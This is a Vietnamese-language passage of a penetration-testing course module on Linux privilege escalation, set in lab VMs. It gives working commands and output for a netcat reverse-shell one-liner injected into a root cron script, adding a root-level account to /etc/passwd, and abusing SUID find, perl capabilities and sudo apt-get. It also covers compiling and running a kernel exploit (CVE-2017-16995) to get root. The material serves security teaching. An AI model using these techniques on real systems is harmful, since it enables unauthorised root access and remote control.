Trong ví dụ này, chúng ta sẽ SSH vào VM 1 với tư cách người dùng `joe`, sử dụng mật khẩu `offsec`. Trong một phần trước đó, chúng ta đã trình bày vị trí cần kiểm tra trong hệ thống tệp để tìm các cron job đã được cài đặt trên hệ thống mục tiêu. Chúng ta cũng có thể kiểm tra tệp log của cron (`/var/log/cron.log`) để xem các cron job đang chạy:

```
joe@debian-privesc:~$ grep "CRON" /var/log/syslog
...
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (pidfile fd = 3)
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (Running @reboot jobs)
Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```

                                                      *Listing 35 - Kiểm tra tệp log của cron*

Có vẻ như một script có tên user_backups.sh nằm dưới /home/joe/ đang được thực thi trong ngữ cảnh của người dùng root. Dựa trên các mốc thời gian, có thể thấy rằng job này chạy mỗi phút một lần.

Vì chúng ta đã biết vị trí của script, chúng ta có thể kiểm tra nội dung và quyền của nó.

```
joe@debian-privesc:~$ cat /home/joe/.scripts/user_backups.sh
#!/bin/bash

cp -rf /home/joe/ /var/backups/joe/

joe@debian-privesc:~$ ls -lah /home/joe/.scripts/user_backups.sh
-rwxrwxrw- 1 root root 49 Aug 25 05:12 /home/joe/.scripts/user_backups.sh
```

                            *Listing 36 - Hiển thị nội dung và quyền của script user_backups.sh*

Bản thân script này khá đơn giản: nó chỉ sao chép thư mục home của người dùng vào thư mục con backups. Các quyền của script cho thấy rằng mọi người dùng cục bộ đều có thể ghi vào tệp này.

Vì một người dùng không đặc quyền có thể chỉnh sửa nội dung của script sao lưu, chúng ta có thể sửa đổi nó và chèn một one-liner reverse shell. Nếu kế hoạch của chúng ta hoạt động, chúng ta sẽ nhận được một reverse shell với quyền root trên máy tấn công sau tối đa là một phút.

```
joe@debian-privesc:~$ cd .scripts

joe@debian-privesc:~/.scripts$ echo >> user_backups.sh

joe@debian-privesc:~/.scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh

joe@debian-privesc:~/.scripts$ cat user_backups.sh
#!/bin/bash

cp -rf /home/joe/ /var/backups/joe/

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
```

                              *Listing 37 - Chèn one-liner reverse shell vào user_backups.sh*

Tất cả những gì chúng ta cần làm bây giờ là thiết lập một listener trên máy Kali Linux của mình và chờ cron job được thực thi:

```
kali@kali:~$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.214] 57698
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

                                                   *Listing 38 - Nhận được root shell từ mục tiêu*

Như được thể hiện trong listing trước, cron job đã được thực thi, đồng thời one-liner reverse shell cũng đã chạy. Chúng ta đã leo thang đặc quyền thành công và có quyền truy cập vào một root shell trên mục tiêu.

Mặc dù đây là một ví dụ đơn giản, nhưng không hiếm khi gặp các tình huống tương tự trong thực tế, vì các quản trị viên thường tập trung nhiều hơn vào việc đưa hệ thống vào môi trường production hơn là bảo mật quyền của các tệp script.

---

## 3.2. Lạm dụng xác thực bằng mật khẩu

---

Trừ khi sử dụng một hệ thống quản lý thông tin xác thực tập trung như Active Directory hoặc LDAP, mật khẩu trên Linux thường được lưu trữ trong /etc/shadow, tệp này không thể đọc được bởi người dùng thông thường. Tuy nhiên, về mặt lịch sử, các hash mật khẩu, cùng với các thông tin tài khoản khác, từng được lưu trong tệp /etc/passwd có thể đọc được bởi mọi người. Để đảm bảo khả năng tương thích ngược, nếu một hash mật khẩu xuất hiện ở cột thứ hai của một bản ghi người dùng trong /etc/passwd, thì hash đó được xem là hợp lệ cho mục đích xác thực và sẽ được ưu tiên hơn so với mục tương ứng trong /etc/shadow, nếu có. Điều này có nghĩa là nếu chúng ta có thể ghi vào /etc/passwd, chúng ta có thể thiết lập một mật khẩu tùy ý cho bất kỳ tài khoản nào.

Hãy minh họa điều này. Trong một phần trước, chúng ta đã chỉ ra rằng máy Debian của chúng ta có thể dễ bị leo thang đặc quyền do quyền của tệp /etc/passwd không được thiết lập đúng cách. Để leo thang đặc quyền, hãy thêm một superuser khác (root2) cùng với hash mật khẩu tương ứng vào /etc/passwd. Trước tiên, chúng ta sẽ tạo hash mật khẩu bằng công cụ openssl với đối số passwd. Theo mặc định, nếu không chỉ định tùy chọn nào khác, openssl sẽ tạo hash bằng thuật toán crypt một cơ chế băm được Linux hỗ trợ cho xác thực.

Đầu ra của lệnh OpenSSL passwd có thể khác nhau tùy thuộc vào hệ thống thực thi nó. Trên các hệ thống cũ, nó có thể mặc định sử dụng thuật toán DES, trong khi trên một số hệ thống mới hơn, nó có thể xuất ra mật khẩu ở định dạng MD5.

Sau khi đã có hash được tạo, chúng ta sẽ thêm một dòng vào /etc/passwd theo đúng định dạng:

```
joe@debian-privesc:~$ openssl passwd w00t
Fdzt.eqJQ4s0g

joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

joe@debian-privesc:~$ su root2
Password: w00t

root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)
```

                             *Listing 39 - Leo thang đặc quyền bằng cách chỉnh sửa /etc/passwd*

Như được thể hiện trong Listing 39, người dùng root2 và hash mật khẩu w00t trong bản ghi /etc/passwd của chúng ta được theo sau bởi user id (UID) bằng 0 và group id (GID) bằng 0. Các giá trị bằng 0 này chỉ định rằng tài khoản mà chúng ta tạo ra là một tài khoản superuser trên Linux. Cuối cùng, để xác minh rằng các chỉnh sửa của chúng ta là hợp lệ, chúng ta đã sử dụng su để chuyển từ người dùng tiêu chuẩn sang tài khoản root2 mới được tạo, sau đó thực thi lệnh id để chứng minh rằng chúng ta thực sự có đặc quyền root.

Mặc dù việc phát hiện /etc/passwd có quyền ghi cho mọi người (world-writable) có vẻ không khả thi, nhưng nhiều tổ chức triển khai các tích hợp lai với các nhà cung cấp bên thứ ba, điều này có thể làm suy giảm bảo mật để đổi lấy tính tiện dụng cao hơn.

---

# 4. Các thành phần hệ thống không an toàn

---

Learning Unit này bao gồm các Learning Objective sau:

- Lạm dụng các chương trình SUID và capability để leo thang đặc quyền
- Vượt qua các quyền sudo đặc biệt để leo thang đặc quyền
- Liệt kê kernel của hệ thống để tìm các lỗ hổng đã biết, sau đó lạm dụng chúng để leo thang đặc quyền

Trong Learning Unit này, chúng ta sẽ khám phá cách các ứng dụng hệ thống và quyền truy cập bị cấu hình sai cũng có thể dẫn đến việc nâng cao đặc quyền.

---

## 4.1. Lạm dụng các binary Setuid và Capability

---

Như chúng ta đã dự đoán trước đó trong Module này, khi không được bảo vệ đúng cách, các binary setuid có thể dẫn đến các cuộc tấn công cho phép leo thang đặc quyền.

Trước khi thử kỹ thuật khai thác thực tế, hãy cùng xem lại mục đích của một binary setuid thông qua một ví dụ ngắn. Khi một người dùng hoặc một script tự động của hệ thống khởi chạy một tiến trình, tiến trình đó sẽ kế thừa UID/GID của script khởi tạo: điều này được gọi là real UID/GID.

Như đã thảo luận trước đó, mật khẩu người dùng được lưu trữ dưới dạng hash trong /etc/shadow, tệp này thuộc sở hữu và chỉ có thể ghi bởi root (uid=0). Vậy thì làm thế nào người dùng không đặc quyền có thể truy cập tệp này để thay đổi mật khẩu của chính họ?

Để giải quyết vấn đề này, khái niệm effective UID/GID đã được giới thiệu, đại diện cho giá trị thực tế được kiểm tra khi thực hiện các thao tác nhạy cảm.

Để minh họa rõ hơn khái niệm này, hãy phân tích chương trình passwd, chương trình chịu trách nhiệm thay đổi mật khẩu cho người dùng thực thi nó. Trên máy lab Debian, chúng ta sẽ kết nối với tư cách joe và thực thi lệnh passwd mà không nhập thêm bất cứ thứ gì sau đó, để tiến trình vẫn tồn tại trong bộ nhớ.

```
joe@debian-privesc:~$ passwd
Changing password for joe.
Current password:
```

                                                   *Listing 40 - Thực thi chương trình passwd*

Giữ chương trình ở trạng thái chờ, hãy mở một shell khác với tư cách joe để kiểm tra tiến trình kỹ hơn.

Để tìm PID (process ID) của chương trình passwd, chúng ta có thể liệt kê tất cả các tiến trình và lọc đầu ra dựa trên tên mục tiêu:

```
joe@debian-privesc:~$ ps u -C passwd
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root      1932  0.0  0.1   9364  2984 pts/0    S+   01:51   0:00 passwd
```

                                *Listing 41 - Kiểm tra thông tin xác thực tiến trình của passwd*

Một cách thú vị, passwd đang chạy với tư cách người dùng root: điều này là cần thiết để nó có thể truy cập và chỉnh sửa /etc/shadow.

Chúng ta cũng có thể kiểm tra real UID và effective UID được gán cho tiến trình bằng cách kiểm tra pseudo-filesystem proc, cho phép chúng ta tương tác với thông tin kernel. Sử dụng PID của passwd (1932) từ đầu ra trước đó, hãy kiểm tra nội dung tại /proc/1932/status, nơi cung cấp bản tóm tắt các thuộc tính của tiến trình:

```
joe@debian-privesc:~$ grep Uid /proc/1932/status
Uid:	1000	0	0	0
```

                                *Listing 42 - Kiểm tra thông tin xác thực tiến trình của passwd*

Việc lọc theo từ khóa “Uid” trả về bốn tham số tương ứng với real, effective, saved set và filesystem UID. Trong trường hợp này, giá trị Real UID là 1000, điều này là hợp lý vì nó thuộc về joe. Tuy nhiên, ba giá trị còn lại, bao gồm effective UID, đều bằng 0, tức là ID của root: hãy xem xét lý do vì sao.

Trong các điều kiện bình thường, cả bốn giá trị này sẽ thuộc về cùng một người dùng đã khởi chạy file thực thi. Ví dụ, tiến trình bash của joe (PID 1131 trong trường hợp này) có các giá trị sau:

```
joe@debian-privesc:~$ cat /proc/1131/status | grep Uid
Uid:	1000	1000	1000	1000
```

                                         *Listing 43 - Kiểm tra thông tin xác thực tiến trình bash*

Binary passwd hoạt động khác biệt vì chương trình này có một cờ đặc biệt gọi là Set-User-ID, hay viết tắt là SUID. Hãy kiểm tra nó:

```
joe@debian-privesc:~$ ls -asl /usr/bin/passwd
64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
```

                             *Listing 44 - Hiển thị cờ SUID trong ứng dụng nhị phân passwd*

Cờ SUID được biểu diễn bằng ký tự s trong đầu ra ở trên. Cờ này có thể được cấu hình bằng lệnh chmod u+s <filename>, và nó thiết lập effective UID của tiến trình đang chạy bằng user ID của chủ sở hữu file thực thi - trong trường hợp này là root.

Việc sử dụng kỹ thuật này tạo ra một hình thức leo thang đặc quyền hợp lệ và có kiểm soát, và vì lý do đó (như chúng ta sẽ học ngay sau đây), binary SUID phải không có lỗi để tránh mọi khả năng bị lạm dụng.

Là một ví dụ thực tế, sau khi hoàn tất liệt kê thủ công hoặc tự động, chúng ta sẽ phát hiện rằng tiện ích find bị cấu hình sai và có cờ SUID được thiết lập.

Chúng ta có thể nhanh chóng lạm dụng lỗ hổng này bằng cách chạy chương trình find để tìm kiếm một tệp quen thuộc, chẳng hạn như thư mục Desktop của chính chúng ta. Khi tệp được tìm thấy, chúng ta có thể yêu cầu find thực thi bất kỳ hành động nào thông qua tham số -exec. Trong trường hợp này, chúng ta muốn thực thi một bash shell kèm theo tham số Set Builtin -p, tham số này ngăn việc effective user bị reset.

```
joe@debian-privesc:~$ find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
bash-5.0# id
uid=1000(joe) gid=1000(joe) euid=0(root) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
bash-5.0# whoami
root
```

                      *Listing 45 - Giành được root shell bằng cách lạm dụng chương trình SUID*

Sau khi chạy lệnh, chúng ta đã có được một root shell và sẽ thấy rằng mặc dù UID vẫn thuộc về joe, nhưng effective user ID lại là của root.

Một nhóm tính năng khác cũng thường bị lợi dụng cho các kỹ thuật leo thang đặc quyền là Linux capability.

Capability là các thuộc tính bổ sung có thể được áp dụng cho tiến trình, binary và dịch vụ nhằm gán các đặc quyền cụ thể vốn thường chỉ dành cho các thao tác quản trị, chẳng hạn như bắt lưu lượng mạng hoặc thêm kernel module. Tương tự như các binary setuid, nếu bị cấu hình sai, các capability này có thể cho phép kẻ tấn công leo thang đặc quyền lên root.

Để minh họa các rủi ro này, hãy thử liệt kê thủ công hệ thống mục tiêu để tìm các binary có capability. Chúng ta sẽ chạy getcap với tham số -r để thực hiện tìm kiếm đệ quy bắt đầu từ thư mục gốc /, đồng thời lọc bỏ mọi lỗi khỏi đầu ra terminal.

```
joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

                                              *Listing 46 - Liệt kê capability một cách thủ công*

Hai binary perl nổi bật vì chúng có capability setuid được bật, kèm theo cờ +ep cho biết các capability này đang ở trạng thái effective và permitted.

Mặc dù trông có vẻ tương tự, capability, setuid và cờ setuid thực chất được lưu trữ ở các vị trí khác nhau trong định dạng file ELF của Linux.

Để khai thác cấu hình sai về capability này, chúng ta có thể tham khảo trang web GTFOBins. Trang web này cung cấp một danh sách có tổ chức các binary UNIX cùng với cách chúng có thể bị lạm dụng để leo thang đặc quyền.

Khi tìm kiếm “Perl” trên trang GTFOBins, chúng ta sẽ tìm thấy các hướng dẫn chính xác về lệnh cần dùng để khai thác capability. Chúng ta sẽ sử dụng toàn bộ lệnh, lệnh này thực thi một shell kèm theo một số chỉ thị POSIX cho phép setuid.

```
joe@debian-privesc:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
perl: warning: Setting locale failed.
...
# id
uid=0(root) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
```

                               *Listing 47 - Giành được root shell thông qua khai thác capability*

Tuyệt vời! Chúng ta đã thành công trong việc giành được một root shell thông qua một vector cấu hình sai khác.

---

## 4.2. Lạm dụng Sudo

---

Trên các hệ thống UNIX, tiện ích sudo có thể được sử dụng để thực thi một lệnh với đặc quyền nâng cao. Để có thể sử dụng sudo, tài khoản người dùng có đặc quyền thấp của chúng ta phải là thành viên của nhóm sudo (trên các bản phân phối Linux dựa trên Debian). Từ “sudo” là viết tắt của “Superuser-Do”, và chúng ta có thể hiểu nó như việc thay đổi effective user-id của lệnh được thực thi.

Các cấu hình tùy chỉnh liên quan đến quyền sudo có thể được áp dụng trong tệp /etc/sudoers. Chúng ta có thể sử dụng tùy chọn -l hoặc --list để liệt kê các lệnh được phép đối với người dùng hiện tại.

```
joe@debian-privesc:~$ sudo -l
[sudo] password for joe:
Matching Defaults entries for joe on debian-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User joe may run the following commands on debian-privesc:
    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```

                                    *Listing 48 - Kiểm tra các quyền sudo của người dùng hiện tại*

Từ đầu ra trong Listing 48, chúng ta nhận thấy rằng chỉ có các tiện ích crontab, tcpdump và apt-get được liệt kê là cho phép chạy với sudo.

Nếu cấu hình trong /etc/sudoers quá lỏng lẻo, một người dùng có thể lạm dụng quyền quản trị ngắn hạn này để giành quyền truy cập root vĩnh viễn.

Vì lệnh đầu tiên trong ba lệnh được cho phép không cho phép chúng ta chỉnh sửa bất kỳ crontab nào, nên khó có khả năng sử dụng nó để tìm ra con đường leo thang đặc quyền. Lệnh thứ hai trông có vẻ hứa hẹn hơn, vì vậy hãy truy cập GTFOBins để tìm gợi ý về cách lạm dụng nó.

Tuy nhiên, việc chạy các lệnh được gợi ý lại cho thấy một kết quả không mong đợi:

```
joe@debian-privesc:~$ COMMAND='id'
joe@debian-privesc:~$ TF=$(mktemp)
joe@debian-privesc:~$ echo "$COMMAND" > $TF
joe@debian-privesc:~$ chmod +x $TF
joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
[sudo] password for joe:
dropped privs to root
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...
compress_savefile: execlp(/tmp/tmp.c5hrJ5UrsF, /dev/null) failed: Permission denied
```

                                        *Listing 49 - Thử lạm dụng quyền sudo của tcpdump*

Một cách đáng ngạc nhiên, sau khi thực thi tập lệnh được đề xuất, chúng ta nhận được thông báo lỗi “permission denied”.

Để điều tra sâu hơn nguyên nhân, chúng ta có thể kiểm tra tệp syslog để tìm bất kỳ sự kiện nào liên quan đến từ khóa tcpdump.

```
joe@debian-privesc:~$ cat /var/log/syslog | grep tcpdump
...
Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
```

                          *Listing 50 - Kiểm tra tệp syslog cho các sự kiện liên quan đến “tcpdump”*

Đầu ra trong Listing 50 cho thấy daemon audit đã ghi nhận lại nỗ lực leo thang đặc quyền của chúng ta. Quan sát kỹ hơn cho thấy AppArmor đã được kích hoạt và chặn hành vi này.

AppArmor là một kernel module cung cấp cơ chế mandatory access control (MAC) trên các hệ thống Linux bằng cách áp dụng nhiều profile dành riêng cho từng ứng dụng, và nó được bật mặc định trên Debian 10. Chúng ta có thể xác minh trạng thái của AppArmor với tư cách người dùng root bằng lệnh aa-status.

```
joe@debian-privesc:~$ su - root
Password:
root@debian-privesc:~# aa-status
apparmor module is loaded.
20 profiles are loaded.
18 profiles are in enforce mode.
   /usr/bin/evince
   /usr/bin/evince-previewer
   /usr/bin/evince-previewer//sanitized_helper
   /usr/bin/evince-thumbnailer
   /usr/bin/evince//sanitized_helper
   /usr/bin/man
   /usr/lib/cups/backend/cups-pdf
   /usr/sbin/cups-browsed
   /usr/sbin/cupsd
   /usr/sbin/cupsd//third_party
   /usr/sbin/tcpdump
...
2 profiles are in complain mode.
   libreoffice-oopslash
   libreoffice-soffice
3 processes have profiles defined.
3 processes are in enforce mode.
   /usr/sbin/cups-browsed (502)
   /usr/sbin/cupsd (654)
   /usr/lib/cups/notifier/dbus (658) /usr/sbin/cupsd
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.
```

                                                   *Listing 51 - Xác minh trạng thái AppArmor*

Listing 51 xác nhận rằng tcpdump đang được bảo vệ tích cực bởi một profile AppArmor riêng biệt.

Vì hai lệnh đầu tiên trong tệp sudoers không hoạt động, hãy kiểm tra lệnh sudo thứ ba được cho phép: apt-get. Quay lại GTFOBins chúng ta sẽ chọn tùy chọn đầu tiên (a). Payload này trước tiên chạy tùy chọn changelog của apt-get, từ đó gọi ứng dụng less, nơi chúng ta có thể thực thi một bash shell.

```
sudo apt-get changelog apt
!/bin/sh
```

                                           *Listing 52 - Payload leo thang đặc quyền với apt-get*

Chúng ta có thể thử các lệnh trên với tư cách người dùng joe bằng cách sao chép chúng vào shell đang hoạt động.

```
joe@debian-privesc:~$ sudo apt-get changelog apt
...
Fetched 459 kB in 0s (39.7 MB/s)
# id
uid=0(root) gid=0(root) groups=0(root)
```

                          *Listing 53 - Giành được root shell bằng cách lạm dụng quyền sudo*

Xuất sắc! Chúng ta đã thành công trong việc giành được một root shell đặc quyền bằng cách lạm dụng một cấu hình sudo bị thiết lập sai.

Trong phần cuối cùng, chúng ta sẽ học cách liệt kê các exploit kernel Linux và nghiên cứu cách leo thang đặc quyền thông qua chúng.

---

## 4.3. Khai thác lỗ hổng Kernel

---

Các exploit kernel là một phương pháp rất hiệu quả để leo thang đặc quyền, tuy nhiên mức độ thành công của chúng có thể phụ thuộc không chỉ vào việc khớp phiên bản kernel của mục tiêu, mà còn vào loại hệ điều hành, chẳng hạn như Debian, RHEL, Gentoo, v.v.

Để minh họa vector tấn công này, trước tiên chúng ta sẽ thu thập thông tin về máy mục tiêu Ubuntu bằng cách kiểm tra tệp /etc/issue. Như đã thảo luận trước đó trong Module, đây là một tệp văn bản hệ thống chứa thông báo hoặc thông tin nhận dạng hệ thống, được hiển thị trước dấu nhắc đăng nhập trên các máy Linux.

```
joe@ubuntu-privesc:~$ cat /etc/issue
Ubuntu 16.04.4 LTS \n \l
```

                                 *Listing 55 - Thu thập thông tin tổng quan về hệ thống mục tiêu*

Tiếp theo, chúng ta sẽ kiểm tra phiên bản kernel và kiến trúc hệ thống bằng các lệnh hệ thống tiêu chuẩn:

```
joe@ubuntu-privesc:~$ uname -r 
4.4.0-116-generic

joe@ubuntu-privesc:~$ arch 
x86_64
```

                        *Listing 56 - Thu thập thông tin kernel và kiến trúc từ mục tiêu Linux*

Hệ thống mục tiêu của chúng ta dường như đang chạy Ubuntu 16.04.3 LTS (kernel 4.4.0-116-generic) trên kiến trúc x86_64. Với những thông tin này, chúng ta có thể sử dụng searchsploit trên hệ thống Kali cục bộ để tìm các exploit kernel phù hợp với phiên bản mục tiêu. Chúng ta sẽ sử dụng “linux kernel Ubuntu 16 Local Privilege Escalation” làm từ khóa chính. Đồng thời, chúng ta cũng muốn lọc bớt các kết quả không cần thiết, vì vậy sẽ loại trừ mọi thứ có kernel thấp hơn 4.4.0 và bất kỳ thứ gì khớp với kernel phiên bản 4.8.

```
kali@kali:~$ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - 'ldso_hwcap_64 Stack Clash' Local Privilege Escalation| linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso_dynamic Stack Clash' Local Privilege Escalation                       | linux_x86/local/42276.c
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1)                                                                      | linux/local/39166.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)                                                                           | linux/local/40759.rb
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege Escalation                                                   | linux_x86-64/local/40049.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation                                                              | linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escalation                                                                    | linux/local/40489.txt
Linux Kernel < 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Privilege Escalation (1)                                                                 | linux_x86/local/15916.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                             | linux/local/45010.c
```

               *Listing 57 - Sử dụng searchsploit để tìm exploit leo thang đặc quyền cho mục tiêu*

Hãy thử exploit cuối cùng (linux/local/45010.c), vì nó có vẻ mới hơn và cũng khớp với phiên bản kernel của chúng ta do nó nhắm tới mọi phiên bản thấp hơn 4.13.9.

Chúng ta sẽ sử dụng gcc trên Linux để biên dịch exploit, lưu ý rằng khi biên dịch mã, chúng ta phải khớp với kiến trúc của mục tiêu. Điều này đặc biệt quan trọng trong các tình huống mà máy mục tiêu không có trình biên dịch và chúng ta buộc phải biên dịch exploit trên máy tấn công hoặc trong một môi trường sandbox mô phỏng hệ điều hành và kiến trúc của mục tiêu.

Mặc dù việc học mọi chi tiết của một exploit kernel Linux nằm ngoài phạm vi của Module này, chúng ta vẫn cần hiểu các hướng dẫn biên dịch ban đầu. Để làm được điều đó, hãy sao chép exploit vào thư mục home của Kali và kiểm tra 20 dòng đầu tiên để tìm các chỉ dẫn biên dịch.

```
kali@kali:~$ cp /usr/share/exploitdb/exploits/linux/local/45010.c .

kali@kali:~$ head 45010.c -n 20
/*
  Credit @bleidl, this is a slight modification to his original POC
  https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c

  For details on how the exploit works, please visit
  https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html

  Tested on Ubuntu 16.04 with the following Kernels
  4.4.0-31-generic
  4.4.0-62-generic
  4.4.0-81-generic
  4.4.0-116-generic
  4.8.0-58-generic
  4.10.0.42-generic
  4.13.0-21-generic

  Tested on Fedora 27
  4.13.9-300
  gcc cve-2017-16995.c -o cve-2017-16995
  internet@client:~/cve-2017-16995$ ./cve-2017-16995
```

                                       *Listing 58 - Xác định các chỉ dẫn trong mã nguồn exploit*

May mắn thay, để biên dịch mã nguồn thành một file thực thi, chúng ta chỉ cần gọi gcc và chỉ định mã nguồn C cùng với tên file đầu ra. Để đơn giản hóa quá trình này, chúng ta cũng có thể đổi tên file nguồn để khớp với tên được mong đợi trong quy trình của exploit. Sau khi đổi tên, chúng ta chỉ cần dán các hướng dẫn biên dịch gốc để biên dịch mã C.

```
kali@kali:~$ mv 45010.c cve-2017-16995.c
```

                                                                  *Listing 59 - Đổi tên exploit*

Để đảm bảo quá trình biên dịch diễn ra trơn tru nhất có thể, chúng ta tận dụng việc máy mục tiêu đã được cài sẵn GCC. Vì lý do này, chúng ta có thể biên dịch và chạy exploit trực tiếp trên máy mục tiêu. Hệ quả của cách làm này là chúng ta có thể sử dụng đúng phiên bản thư viện tương ứng với kiến trúc của mục tiêu, từ đó giảm thiểu rủi ro liên quan đến các vấn đề tương thích khi cross-compilation. Trước hết, chúng ta chuyển mã nguồn exploit sang máy mục tiêu thông qua công cụ SCP.

```
kali@kali:~$ scp cve-2017-16995.c joe@192.168.123.216
```

                                          *Listing 60 - Chuyển mã nguồn sang máy mục tiêu*

Sau khi chuyển xong, chúng ta kết nối tới máy mục tiêu và gọi GCC để biên dịch exploit, cung cấp mã nguồn làm đối số đầu tiên và tên file nhị phân làm đầu ra cho tham số -o.

```
joe@ubuntu-privesc:~$ gcc cve-2017-16995.c -o cve-2017-16995
```

                                               *Listing 61 - Biên dịch exploit trên máy mục tiêu*

Chúng ta có thể yên tâm rằng gcc đã biên dịch thành công vì nó không xuất ra bất kỳ lỗi nào.

Sử dụng tiện ích file, chúng ta cũng có thể kiểm tra kiến trúc của file ELF Linux.

```
joe@ubuntu-privesc:~$ file cve-2017-16995
cve-2017-16995: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=588d687459a0e60bc6cb984b5180ec8c3558dc33, not stripped
```

                                     *Listing 62 - Kiểm tra kiến trúc của file nhị phân exploit*

Với tất cả các điều kiện cần thiết đã sẵn sàng, giờ đây chúng ta có thể chạy exploit leo thang đặc quyền kernel Linux.

```
joe@ubuntu-privesc:~$ ./cve-2017-16995
[.]
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.]
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.]
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88007bd1f100
[*] Leaking sock struct from ffff880079bd9c00
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880075c11e40
[*] UID from cred structure: 1001, matches the current: 1001
[*] hammering cred structure at ffff880075c11e40
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),1001(joe)
#
```

                                  *Listing 54 - Giành được root shell thông qua khai thác kernel*

Tuyệt vời! Chúng ta đã thành công trong việc giành được một root shell bằng cách khai thác một lỗ hổng kernel đã biết.

Trong phần này, chúng ta đã học cách liệt kê thủ công hệ thống mục tiêu để tìm các lỗ hổng kernel đã biết. Sau đó, chúng ta tìm hiểu cách cung cấp các thông tin này cho searchsploit để lựa chọn đúng mã nguồn exploit. Cuối cùng, chúng ta đã biên dịch exploit và chạy nó trên máy mục tiêu để giành được một shell quản trị.

---

# 5. Tổng kết

---

Trong Module này, chúng ta đã bao quát nhiều khái niệm xoay quanh việc leo thang đặc quyền trên Linux. Chúng ta đã khám phá cả các kỹ thuật liệt kê thủ công và tự động nhằm làm lộ những thông tin cần thiết cho các dạng tấn công này. Chúng ta cũng xem xét cách giành quyền truy cập quản trị thông qua thông tin xác thực không được bảo vệ, quyền tệp không an toàn và các cờ nhị phân. Cuối cùng, chúng ta kết thúc bằng việc học cách liệt kê các lỗ hổng kernel và tìm các exploit tương ứng.

---

# 6. Luyện tập

---

## TryHackMe

---

[Linux PrivEsc Arena](https://tryhackme.com/room/linuxprivescarena)

[Common Linux Privesc](https://tryhackme.com/room/commonlinuxprivesc)

[Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)